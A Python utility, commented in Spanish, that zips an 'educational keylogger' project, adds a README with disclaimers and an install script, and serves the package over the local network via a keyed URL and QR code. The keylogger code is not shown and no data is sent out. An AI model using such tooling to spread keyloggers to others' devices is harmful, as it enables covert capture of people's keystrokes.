#!/usr/bin/env python3
"""
Utilidad de Transferencia Segura para Keylogger Educativo
Autor: Alvaro Manzo

Permite transferir de manera segura el keylogger a otros dispositivos propios
"""

import socket
import json
import os
import base64
import hashlib
import zipfile
import tempfile
from datetime import datetime
import qrcode
from io import BytesIO
import threading

class SecureTransfer:
    def __init__(self, port=8888):
        self.port = port
        self.transfer_key = self.generate_transfer_key()
        
    def generate_transfer_key(self):
        """Generar clave única para la transferencia"""
        timestamp = datetime.now().isoformat()
        random_data = os.urandom(16)
        key_data = f"{timestamp}{random_data.hex()}"
        return hashlib.sha256(key_data.encode()).hexdigest()[:16]
    
    def get_local_ip(self):
        """Obtener IP local"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def create_package(self):
        """Crear paquete con todos los archivos necesarios"""
        package_name = f"keylogger_package_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
        
        files_to_package = [
            "keylogger_advanced.py",
            "dashboard.py", 
            "requirements.txt",
            "templates/dashboard.html"
        ]
        
        # Crear README con instrucciones
        readme_content = f"""
# Keylogger Educativo - Paquete de Instalación

## ⚠️ AVISO LEGAL
Este software es únicamente para fines educativos y uso en sistemas propios.
El uso indebido puede ser ilegal.

## Instalación

1. Extraer todos los archivos
2. Instalar dependencias:
   ```
   pip install -r requirements.txt
   ```

3. Ejecutar el keylogger:
   ```
   python keylogger_advanced.py
   ```

4. Para el dashboard web:
   ```
   python dashboard.py
   ```
   Luego visita: http://localhost:5000

## Características

✅ Interfaz colorida y amigable
✅ Encriptación de logs
✅ Dashboard web interactivo
✅ Captura de mouse y teclado
✅ Estadísticas en tiempo real
✅ Configuración personalizable

## Configuración

El archivo config.json permite personalizar:
- Captura de mouse
- Encriptación de datos
- Tamaño máximo de archivos
- Y más...

## Uso Ético

- Solo usar en equipos propios
- Informar a usuarios cuando sea requerido
- Respetar la privacidad
- Cumplir con las leyes locales

Clave de transferencia: {self.transfer_key}
Generado: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        
        try:
            with zipfile.ZipFile(package_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
                # Añadir README
                zipf.writestr("README.md", readme_content)
                
                # Añadir archivos del proyecto
                for file_path in files_to_package:
                    if os.path.exists(file_path):
                        zipf.write(file_path)
                    else:
                        print(f"⚠️ Archivo no encontrado: {file_path}")
                
                # Crear script de instalación automática
                install_script = '''#!/bin/bash
echo "🚀 Instalando Keylogger Educativo..."
pip install -r requirements.txt
echo "✅ Instalación completada"
echo "📖 Lee el README.md para instrucciones de uso"
'''
                zipf.writestr("install.sh", install_script)
                
            print(f"📦 Paquete creado: {package_name}")
            return package_name
            
        except Exception as e:
            print(f"❌ Error creando paquete: {e}")
            return None
    
    def generate_qr_code(self, data):
        """Generar código QR para la transferencia"""
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        return img
    
    def start_server(self, package_path):
        """Iniciar servidor para transferencia"""
        if not os.path.exists(package_path):
            print(f"❌ Paquete no encontrado: {package_path}")
            return
        
        # Información de conexión
        ip = self.get_local_ip()
        url = f"http://{ip}:{self.port}/download/{self.transfer_key}"
        
        print(f"""
🌐 Servidor de transferencia iniciado

📡 IP Local: {ip}
🔗 Puerto: {self.port}
🔑 Clave: {self.transfer_key}
📥 URL de descarga: {url}

Instrucciones para recibir en otro dispositivo:
1. Conectarse a la misma red WiFi
2. Abrir navegador web
3. Ir a: {url}
4. O escanear el código QR que aparece abajo

Presiona Ctrl+C para detener el servidor
        """)
        
        # Generar y mostrar código QR
        try:
            qr_img = self.generate_qr_code(url)
            qr_path = "transfer_qr.png"
            qr_img.save(qr_path)
            print(f"📱 Código QR guardado en: {qr_path}")
        except Exception as e:
            print(f"⚠️ No se pudo generar código QR: {e}")
        
        # Iniciar servidor HTTP simple
        self.run_http_server(package_path)
    
    def run_http_server(self, package_path):
        """Ejecutar servidor HTTP para la transferencia"""
        from http.server import HTTPServer, BaseHTTPRequestHandler
        import urllib.parse
        
        class TransferHandler(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                # Silenciar logs del servidor
                pass
            
            def do_GET(self):
                path = urllib.parse.unquote(self.path)
                
                if path == f"/download/{self.server.transfer_key}":
                    # Servir archivo de descarga
                    try:
                        with open(self.server.package_path, 'rb') as f:
                            content = f.read()
                        
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/zip')
                        self.send_header('Content-Disposition', f'attachment; filename="{os.path.basename(self.server.package_path)}"')
                        self.send_header('Content-Length', str(len(content)))
                        self.end_headers()
                        self.wfile.write(content)
                        
                        print(f"📤 Archivo descargado por: {self.client_address[0]}")
                        
                    except Exception as e:
                        self.send_error(500, f"Error sirviendo archivo: {e}")
                
                elif path == "/":
                    # Página de descarga
                    download_url = f"/download/{self.server.transfer_key}"
                    html = f"""
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <title>Keylogger Educativo - Descarga</title>
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <style>
                            body {{
                                font-family: Arial, sans-serif;
                                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                                margin: 0;
                                padding: 20px;
                                min-height: 100vh;
                                display: flex;
                                justify-content: center;
                                align-items: center;
                            }}
                            .container {{
                                background: white;
                                padding: 40px;
                                border-radius: 15px;
                                text-align: center;
                                box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                                max-width: 500px;
                            }}
                            h1 {{ color: #333; }}
                            .warning {{
                                background: #e74c3c;
                                color: white;
                                padding: 15px;
                                border-radius: 5px;
                                margin: 20px 0;
                            }}
                            .download-btn {{
                                background: #3498db;
                                color: white;
                                padding: 15px 30px;
                                border: none;
                                border-radius: 5px;
                                font-size: 18px;
                                text-decoration: none;
                                display: inline-block;
                                margin: 20px 0;
                                cursor: pointer;
                            }}
                            .download-btn:hover {{
                                background: #2980b9;
                            }}
                        </style>
                    </head>
                    <body>
                        <div class="container">
                            <h1>🔍 Keylogger Educativo</h1>
                            <div class="warning">
                                ⚠️ Solo para uso educativo y sistemas propios
                            </div>
                            <p>Haz clic para descargar el paquete completo:</p>
                            <a href="{download_url}" class="download-btn">
                                📥 Descargar Keylogger
                            </a>
                            <p><small>Clave de transferencia: {self.server.transfer_key}</small></p>
                        </div>
                    </body>
                    </html>
                    """
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html; charset=utf-8')
                    self.end_headers()
                    self.wfile.write(html.encode())
                
                else:
                    self.send_error(404, "Página no encontrada")
        
        # Configurar servidor
        server = HTTPServer(('0.0.0.0', self.port), TransferHandler)
        server.transfer_key = self.transfer_key
        server.package_path = package_path
        
        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\n🛑 Servidor detenido")
        finally:
            server.server_close()

def main():
    print("""
🚀 Utilidad de Transferencia Segura
Keylogger Educativo

Selecciona una opción:
1. Crear paquete de instalación
2. Iniciar servidor de transferencia
3. Crear paquete e iniciar servidor
4. Salir
    """)
    
    transfer = SecureTransfer()
    
    while True:
        try:
            choice = input("Opción (1-4): ").strip()
            
            if choice == '1':
                print("\n📦 Creando paquete de instalación...")
                package = transfer.create_package()
                if package:
                    print(f"✅ Paquete creado exitosamente: {package}")
                break
                
            elif choice == '2':
                package_path = input("Ruta del paquete ZIP: ").strip()
                if package_path and os.path.exists(package_path):
                    transfer.start_server(package_path)
                else:
                    print("❌ Archivo no encontrado")
                break
                
            elif choice == '3':
                print("\n📦 Creando paquete...")
                package = transfer.create_package()
                if package:
                    print("\n🌐 Iniciando servidor...")
                    transfer.start_server(package)
                break
                
            elif choice == '4':
                print("👋 ¡Hasta luego!")
                break
                
            else:
                print("❌ Opción inválida")
                
        except KeyboardInterrupt:
            print("\n👋 ¡Hasta luego!")
            break
        except Exception as e:
            print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
